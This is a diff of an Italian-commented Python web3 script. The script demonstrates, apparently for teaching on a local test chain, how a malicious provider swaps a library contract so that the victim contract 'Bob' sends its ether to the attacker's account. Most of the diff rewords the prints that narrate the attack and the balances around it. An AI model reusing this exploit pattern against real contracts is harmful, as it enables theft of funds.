@@ -359,22 +359,21 @@ setProviderBytecode = "6060604052341561000f57600080fd5b33600160006101000a8154817
 accounts = web3.eth.accounts
 # Set dell'account con il quale farò i deploy
 web3.eth.defaultAccount = web3.eth.accounts[0]
-print("Account di default:\n" + accounts[0] + "\n")
 
 # Definisco un oggetto contratto bob a partire dall'interfaccia e dal bytecode
 bobContract = web3.eth.contract(abi=bobInterfaceJS, bytecode=bobBytecode)
 # Costruisco la transazione per fare il deploy del contratto bob
-contract_data = bobContract.constructor().buildTransaction({'value': 5000000000000000000})
+contract_data = bobContract.constructor().buildTransaction({'from': accounts[0], 'value': 5000000000000000000})
 # Spedisco la transazione 
 deploy_txn = web3.eth.sendTransaction(contract_data)
 #Attendo che la mia transazione venga elaborata e prendo la ricevuta
 txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
 # Salvo in un oggetto il contratto deployato
 contract_bob = web3.eth.contract(address=txn_receipt.contractAddress, abi=bobInterfaceJS)
-# Funzioni del contratto bob
-print("Funzioni offerte dal contratto bob:\n" + str(contract_bob.all_functions()) + "\n")
-# Bilancio del contratto bob
-print("Bilancio del contratto bob:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
+# Address, balance e functions di Bob
+print("L'account[0] ha pubblicato il contratto Bob: " + str((contract_bob.address)) 
++ "\nil cui bilancio iniziale è: " + str(web3.eth.getBalance(contract_bob.address)) + "\ned offre le seguenti funzioni:" + "\n"
++ str(contract_bob.all_functions()) + "\n")
 
 # Definisco un oggetto contratto set a partire dall'interfaccia e dal bytecode
 setContract = web3.eth.contract(abi=setInterfaceJS, bytecode=setBytecode)
@@ -386,8 +385,9 @@ deploy_txn = web3.eth.sendTransaction(contract_data)
 txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
 # Salvo in un oggetto il contratto deployato
 contract_set = web3.eth.contract(address=txn_receipt.contractAddress, abi=setInterfaceJS)
-# Funzioni del contratto set
-print("Funzioni offerte dal contratto set:\n" + str(contract_set.all_functions()) + "\n")
+# Address, balance e functions di Set
+print("L'account[1] ha pubblicato il contratto Set: " + str((contract_set.address)) 
++ "\nche ed offre le seguenti funzioni:" + "\n" + str(contract_set.all_functions()) + "\n")
 
 # Definisco un oggetto contratto maliciousSet a partire dall'interfaccia e dal bytecode
 maliciousSetContract = web3.eth.contract(abi=maliciousSetInterfaceJS, bytecode=maliciousSetBytecode)
@@ -399,10 +399,11 @@ deploy_txn = web3.eth.sendTransaction(contract_data)
 txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
 # Salvo in un oggetto il contratto deployato
 contract_maliciousSet = web3.eth.contract(address=txn_receipt.contractAddress, abi=maliciousSetInterfaceJS)
-# Funzioni del contratto maliciousSet
-print("Funzioni offerte dal contratto maliciousSet:\n" + str(contract_maliciousSet.all_functions()) + "\n")
+# Address, balance e functions di MaliciousSet
+print("L'account[1] ha pubblicato il contratto MaliciousSet: " + str((contract_maliciousSet.address)) 
++ "\nche ed offre le seguenti funzioni:" + "\n" + str(contract_maliciousSet.all_functions()))
 # Stampa dell'addr a cui andranno i soldi
-# print("A chi andrà il bottino(attackerAddr):\n" + str(contract_maliciousSet.functions.attackerAddr().call()) + "\n")
+print("E' un contratto malevolo che manderà il bottino a (attackerAddr):\n" + str(accounts[1]) + "\n")
 
 # Definisco un oggetto contratto setProvider a partire dall'interfaccia e dal bytecode
 setProviderContract = web3.eth.contract(abi=setProviderInterfaceJS, bytecode=setProviderBytecode)
@@ -414,43 +415,40 @@ deploy_txn = web3.eth.sendTransaction(contract_data)
 txn_receipt = web3.eth.waitForTransactionReceipt(deploy_txn)
 # Salvo in un oggetto il contratto deployato
 contract_setProvider = web3.eth.contract(address=txn_receipt.contractAddress, abi=setProviderInterfaceJS)
-# Funzioni del contratto setProvider
-print("Funzioni offerte dal contratto setProvider:\n" + str(contract_setProvider.all_functions()) + "\n")
+# Address, balance e functions di SetProvider
+print("L'account[1] ha pubblicato il contratto SetProvider: " + str((contract_setProvider.address)) 
++ "\nche ed offre le seguenti funzioni:" + "\n" + str(contract_setProvider.all_functions()) + "\n")
 
-print("=========================BOB SETUP===============================")
-# Stampa del provider di Bob
-print("Provider di Bob:\n" + str(contract_bob.functions.providerAddr().call()) + "\n")
 # Settiamo il provider di Bob
 contract_bob.functions.setProvider(contract_setProvider.address).transact()
 # Stampa del provider di Bob
-print("Provider di Bob:\n" + str(contract_bob.functions.providerAddr().call()) + "\n")
+print("L'account[0] setta il SetProvider del contratto Bob a:\n" + str(contract_bob.functions.providerAddr().call()) + "\n")
 
-print("=========================PROVIDER SETUP===============================")
-# Stampa di set di setProvider
-print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
+# # Stampa di set di setProvider
+# print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
 # Settiamo il set di setProvider (devo usare l'account owner altrimenti non la cambia)
 contract_setProvider.functions.updateLibrary(contract_set.address).transact({'from': accounts[1]})
 # Stampa di set di setProvider
-print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
+print("L'account[1] imposta il componente Set di setProvider a:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
 
 # Vediamo se anche Bob vede la stessa libreria
-print("Versione della libreria set che vede Bob:\n" + str(contract_bob.functions.getVersion().call()) + "\n")
+print("Versione della libreria Set che vede il contratto Bob:\n" + str(contract_bob.functions.getVersion().call()) + "\n")
 
-print("test:\n" + str(contract_bob.functions.insertData(3).transact()) + "\n")
-print("test:\n" + str(contract_bob.functions.getDB(3).call()) + "\n")
+# print("test:\n" + str(contract_bob.functions.insertData(3).transact()) + "\n")
+# print("test:\n" + str(contract_bob.functions.getDB(3).call()) + "\n")
 
 # Adesso il provider malevolo aggiorna la libreria
 contract_setProvider.functions.updateLibrary(contract_maliciousSet.address).transact({'from': accounts[1]})
-print("Aggiornamento della libreria del provider malevolo....")
+print("L'account[1] aggiorna la libreria del provider malevolo....")
 # Stampa di set di setProvider
-print("set di setProvider:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
+print("Indirizzo della libreria aggiornata:\n" + str(contract_setProvider.functions.setLibAddr().call()) + "\n")
 
 # Ricordiamo che i soldi vanno a questo account che adesso ha questi ether
-print("Bilancio dell'account prima dell'attacco:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
-print("Bilancio dell'account prima dell'attacco:\n" + str(web3.eth.getBalance(accounts[1])) + "\n")
+print("Bilancio del contatto Bob prima dell'attacco:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
+print("Bilancio dell'account[1] (ovvero colui che ha pubbicato Set e SetProvider) prima dell'attacco:\n" + str(web3.eth.getBalance(accounts[1])) + "\n")
 # Quando Bob fa getVersion vede la libreria aggiornata ma perde tutti i soldi
 x = contract_bob.functions.getVersion().transact() # altrimenti con call non manda la transazione
-print("Versione della libreria set che vede Bob:\n" + str(contract_bob.functions.getVersion().call()) + "\n")
+print("Versione della libreria Set che vede Bob:\n" + str(contract_bob.functions.getVersion().call()) + "\n")
 # Dopo l'attacco
-print("Bilancio dell'account dopo l'attacco:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
-print("Bilancio dell'account dopo l'attacco:\n" + str(web3.eth.getBalance(accounts[1])) + "\n")
+print("Bilancio del contratto Bob dopo l'attacco:\n" + str(web3.eth.getBalance(contract_bob.address)) + "\n")
+print("Bilancio dell'account[1] dopo l'attacco:\n" + str(web3.eth.getBalance(accounts[1])) + "\n")
